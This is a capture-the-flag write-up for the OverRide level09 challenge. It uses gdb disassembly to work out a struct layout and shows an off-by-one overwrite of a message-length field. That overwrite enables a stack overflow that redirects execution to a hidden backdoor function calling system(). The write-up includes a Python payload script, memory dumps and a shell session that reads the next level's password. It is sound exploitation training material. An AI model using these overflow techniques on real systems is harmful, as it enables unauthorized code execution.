```
level09@OverRide:~$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: userName
>: Welcome, userName
>: Msg @Unix-Dude
>>: hi there
>: Msg sent!
```
```
0x000000000000088c  secret_backdoor
0x00000000000008c0  handle_msg
0x0000000000000932  set_msg
0x00000000000009cd  set_username
0x0000000000000aa8  main
```
prerequisites:

read on Struct Alignment on the stack

https://www.fresh2refresh.com/c-programming/c-struct-memory-allocation/

https://diveintosystems.org/book/C7-x86_64/structs.html

identify a strcut in assembly
```
In assembly language, a "struct" is typically represented as a block of
data with a fixed layout, where each field has a known offset from the
beginning of the block.

To detect if an assembly program uses a struct, you can look for code
that accesses memory locations using specific offsets. For example,
if you see code that loads or stores data at a specific offset relative to
a base address, it may be accessing a struct.

Another clue to look for is the use of instructions that calculate 
addresses based on a base address and an offset. For example, the 
"lea" (load effective address) instruction can be used to calculate the
address of a field in a struct by adding the offset to the base address.

Finally, you can look for code that uses the "mov" (move) instruction 
to copy data from one memory location to another. If the source 
and destination addresses are both relative to a base address and have
offsets that correspond to the layout of a struct, it may be copying a struct.
```

```
main()
{
    handle_msg();
}
```

```
handle_msg()
{
// same buffer passed

    <+11>:	lea    -0xc0(%rbp),%rax     rbp-192     
    <+18>:	add    $0x8c,%rax           140     
    <+24>:	movq   $0x0,(%rax)          some_struct->message[140] = 0
    <+31>:	movq   $0x0,0x8(%rax)
    <+39>:	movq   $0x0,0x10(%rax)      rax+16 = 0
    <+47>:	movq   $0x0,0x18(%rax)      rax+24 = 0
    <+55>:	movq   $0x0,0x20(%rax)      rax+32 = 0
    <+63>:	movl   $0x8c,-0xc(%rbp)     rbp-12 = 140
    <+70>:	lea    -0xc0(%rbp),%rax     
    <+80>:	callq   <set_username>      set_username(rbp-192)   set_username(&some_struct)
    <+85>:	lea    -0xc0(%rbp),%rax     
    <+95>:	callq   <set_msg>           set_msg(rbp-192)
}
```
```c
typedef struct some_struct {
  char message[140];
  char user[40]; 
  size_t msg_len;
                        // size could be deduced from 
                        // "<set_username+157>:	cmpl   $0x28,-0x4(%rbp)", checks if 40 char was passed to the array   
                        // or using Ghidra/BinaryNinja
  
} t_struct;
```
```
set_username()
{
    <+54>:	callq   <puts@plt>
    >: Enter your username
    
    <+92>:	lea    -0x90(%rbp),%rax
    <+99>:	mov    $0x80,%esi
    <+107>:	callq   <fgets@plt>
}
```

```
set_msg()
{
    <set_msg+92>:	lea    -0x400(%rbp),%rax
    <set_msg+99>:	mov    $0x400,%esi
    <set_msg+104>:	mov    %rax,%rdi
    <set_msg+107>:	callq  0x555555554770 <fgets@plt>
    
    (gdb) x/s $rbp-0x400
     0x7fffffffe0c0:	 'A' <repeats 21 times>, "\n"
    
    <set_msg+128>:	lea    -0x400(%rbp),%rcx                "message"    
    <set_msg+135>:	mov    -0x408(%rbp),%rax                ""
    <set_msg+142>:	mov    %rcx,%rsi
    <set_msg+145>:	mov    %rax,%rdi
    <set_msg+148>:	call   <strncpy@plt>     strncpy($rbp-0x400, )
}
```

secret_backdoor() isnt called anywhere, which has system()

```
    <+33>:	call   <fgets@plt>                     ; fgets(input, 0x80, stdin)
    <+38>:	lea    rax,[rbp-0x80]
    <+42>:	mov    rdi,rax
    <+45>:	call   <system@plt>                    ; system(input)
```

```
=> 0x555555554910 <handle_msg+80>:	callq  0x5555555549cd <set_username>

>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

(gdb) x/60wx $rsp

0x7fffffffe558:	0xf7a9608f	0x41414141	0x41414141	0x41414141
0x7fffffffe568:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe578:	0x41414141	0x41414141	0x41414141	0x00000041

size of the buff 10 * 4 + 1 = 41

the extra one is the next elem in the struct, the length of the msg, we overwrite it successfuly
we will just need the exact offset to get from the start of the struct message the the EIP of handl_msg()

```
so copy 41 bytes from the user input to some_struct->username
```
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA        
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>:           ==> takes 41
> msg:
```
********-------------------********

some further debug for more illustration

buffer addr: `<handle_msg+70>:	lea    -0xc0(%rbp),%rax`

```
(gdb) x/60wx $rbp-0xc0
0x7fffffffe4d0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe4e0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe4f0:	0x42424242	0x42424242	0x0000000a	0x00000000
0x7fffffffe500:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe510:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe520:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe530:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe540:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe550:	0x00000000	0x00000000	0x00000000	0x41414141
0x7fffffffe560:	0x41414141	0x41414141	0x0000000a	0x00000000
0x7fffffffe570:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe580:	0x00000000	0x0000008c	0xffffe5a0	0x00007fff
```

set_username() buffer ==> A's ==> 0x7fffffffe584 - 0x7fffffffe55c     = strlen(username) = 40

set_msg() buffer      ==> B's ==> p/x 0x7fffffffe55c - 0x7fffffffe4d0 = strlen(message) = 0x8c / 140

so 41 A's will overwrite the message len

===================

find the func EIP

===================

```
(gdb) info breakpoints
1       breakpoint     keep y   0x00000000000008c0 <handle_msg>
2       breakpoint     keep y   0x0000000000000aa8 <main>

(gdb) define hook-stop
>x/15i $rip
>end
(gdb)

our Buffer starts here

=> 0x555555554915 <handle_msg+85>:	lea    -0xc0(%rbp),%rax
   0x55555555491c <handle_msg+92>:	mov    %rax,%rdi
   0x55555555491f <handle_msg+95>:	callq  0x555555554932 <set_msg>
   
(gdb) x/x $rbp-0xc0
0x7fffffffe4d0

(gdb) info frame
rip at 0x7fffffffe598

p/d 0x7fffffffe598 - 0x7fffffffe4d0 = 200
```

the offset is 200 + secret_backdoor = 208
```
(gdb) p &secret_backdoor
0x88c
```
PIE/ASLR enabled

i should get the address in runtime
```
(gdb) p &secret_backdoor
0x55555555488c
```


```py
import struct

user = "A" * 40

msg_len = "\xd0"

msg = "B" * 200

eip = struct.pack('Q', 0x55555555488c)

bash = "/bin/sh"

print user + msg_len
print msg + eip
print bash
```

```
level09@OverRide:~$ python py.py > pay
level09@OverRide:~$ (cat pay; cat) | ./level09


```

 Q: unsigned long long aka 8 bytes
 
 I:  unsigned integer (4 bytes)

```
level09@OverRide:~$ chmod 777 .
level09@OverRide:~$ nano py.py
level09@OverRide:~$ python py.py > pay
level09@OverRide:~$ (cat pay ; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
pwd
/home/users/level09
whoami
end
cat //home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```





